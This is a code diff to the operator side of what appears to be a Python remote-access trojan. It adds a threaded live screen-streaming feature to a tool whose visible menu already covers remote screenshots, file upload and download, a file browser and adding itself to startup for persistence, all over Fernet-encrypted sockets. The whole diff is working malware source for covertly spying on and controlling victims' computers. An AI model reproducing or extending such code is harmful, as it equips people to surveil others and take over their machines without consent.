@@ -1,6 +1,10 @@
-import socket, os, time, threading, sys, json
+import socket, os, time, threading, sys, json,io
 from queue import Queue
+
+import numpy as np
 from cryptography.fernet import Fernet
+import cv2
+from io import StringIO, BytesIO
 
 arrAddresses = []
 arrConnections = []
@@ -24,6 +28,11 @@ send = lambda data: conn.send(objEncryptor.encrypt(data))
 # function to receive data
 recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))
 
+# boolean to manage stream-state
+stream_active=False
+
+#stream title
+streamTitle=""
 
 def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
@@ -206,6 +215,8 @@ def select_connection(connection_id, blnGetResponse):
 
         if blnGetResponse:
             print(f"You are connected to {arrInfo[0]} ....\n")
+        global streamTitle
+        streamTitle=arrInfo[0]  + " "+ arrInfo[1] + " "+ arrInfo[2]
         return conn
 
 
@@ -240,6 +251,39 @@ def screenshot():
 
     print(f"Done!\nTotal bytes received: {os.path.getsize(strFile)} bytes")
 
+def stream_screen_start():
+    def thread_function():
+
+        global stream_active
+        stream_active= True
+        while stream_active:
+
+
+                                    send(b"stream start")
+                                    strScrnSize = recv(intBuff).decode()  # get screenshot size
+                                    #print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
+
+                                    intBuffer = int(strScrnSize)
+
+                                    strFile = time.strftime("last.png")
+
+                                    frame = recvall(intBuffer)  # get data and write it
+
+                                    nparr = np.fromstring(frame, np.uint8)
+                                    image = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                                    cv2.imshow(streamTitle, image)
+                                    cv2.waitKey(1)
+
+
+    x = threading.Thread(target=thread_function, args=())
+  #  logging.info("Main    : before running thread")
+    x.start()
+
+
+
+def stream_screen_stop():
+    global stream_active
+    stream_active = False
 
 def browse_files():
     send(b"filebrowser")
@@ -426,6 +470,8 @@ def show_help():
     print("R Receive file from the user")
     print("S Send file to the user")
     print("P Take screenshot")
+    print("Y (1) Stream screen start")
+    print("Y (2) Stream screen stop")
     print("A (1) Add to startup")
     print("A (2) Remove from startup")
     print("V View files")
@@ -463,6 +509,10 @@ def send_commands():
                 remove_from_startup()
             elif strChoice == "u":
                 user_info()
+            elif strChoice == "y 1":
+                stream_screen_start()
+            elif strChoice == "y 2":
+                stream_screen_stop()
             elif strChoice == "p":
                 screenshot()
             elif strChoice == "i":
